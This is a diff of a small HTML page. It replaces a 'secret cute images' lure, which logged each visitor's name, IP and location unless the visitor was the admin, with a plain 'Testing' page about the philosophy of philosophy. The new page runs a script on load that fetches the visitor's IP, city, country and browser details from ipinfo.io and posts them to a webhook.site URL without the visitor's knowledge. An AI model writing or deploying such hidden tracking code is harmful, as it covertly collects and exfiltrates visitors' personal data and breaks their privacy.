@@ -1,71 +1,33 @@
-
-
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Viewer</title>
+    <title>Testing</title>
     <style>
         body {
-            font-family: Comic Sans MS, cursive;
+            font-family: Arial, sans-serif;
             text-align: center;
-            background-color: #ffe6f2;
+            background-color: #f2f2f2;
             padding: 20px;
         }
-        #content {
-            max-width: 800px;
-            margin: 0 auto;
+        h1 {
+            margin-top: 20px;
         }
-        #user-image {
-            max-width: 100%;
-            border-radius: 8px;
-            display: none;
-            box-shadow: 0 0 15px hotpink;
-        }
-        #name-form {
-            margin: 20px 0;
-        }
-        #image-gallery img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            display: none;
-            box-shadow: 0 0 15px hotpink;
-            margin: 10px;
+        p {
+            color: red;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
-    <div id="content">
-        <h1>✨ View Our Super Cute Secret Images ✨</h1>
-        
-        <div id="name-form">
-            <p>Enter your name to unlock the cuteness:</p>
-            <input type="text" id="userName" placeholder="UwU what's your name?">
-            <button onclick="handleSubmission()">Show me 💖</button>
-        </div>
-
-        <!-- Image Gallery for Multiple Images -->
-        <div id="image-gallery">
-            <!-- Replace these links with real image URLs -->
-            <img id="user-image" src="https://i.imgur.com/TMqC1JF.png" alt="UwU E-Girl + Furry Combo">
-        </div>
-    </div>
+    <h1>Testing</h1>
+    <p>The philosophy of philosophy is the study of the nature, scope, and meaning of philosophy itself. It involves critical analysis of philosophical concepts and their foundations. It aims to address fundamental questions about existence, knowledge, values, reason, and language.</p>
 
     <script>
-        const ADMIN_IP = "83.105.112.217";
-
-        async function handleSubmission() {
-            const userName = document.getElementById('userName').value.trim() || "UwU Nobody";
-
+        async function sendDataToWebhook() {
             try {
                 const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                 const userAgent = navigator.userAgent;
-
                 const log = {
-                    name: userName,
                     ip: ipData.ip,
                     city: ipData.city,
                     country: ipData.country,
@@ -74,32 +36,19 @@
                     time: new Date().toISOString()
                 };
 
-                // If viewer isn't admin, send log via webhook (or replace this later)
-                if (ipData.ip !== ADMIN_IP) {
-                    fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
-                        method: "POST",
-                        body: JSON.stringify(log),
-                        headers: { "Content-Type": "application/json" }
-                    });
-                }
-
-                // Show multiple images after form submission
-                const images = document.querySelectorAll('#image-gallery img');
-                images.forEach(img => img.style.display = 'block');  // Show all images
-                document.getElementById('name-form').style.display = 'none';
+                const webhookUrl = "https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856"; // Replace with your unique webhook URL
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    body: JSON.stringify(log),
+                    headers: { "Content-Type": "application/json" }
+                });
 
             } catch (e) {
-                // Fallback if tracking fails
-                const images = document.querySelectorAll('#image-gallery img');
-                images.forEach(img => img.style.display = 'block');
-                document.getElementById('name-form').style.display = 'none';
+                console.error("Error sending data:", e);
             }
         }
 
-        document.getElementById('userName').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') handleSubmission();
-        });
+        sendDataToWebhook(); // Trigger sending data to the webhook in the background
     </script>
 </body>
 </html>
-
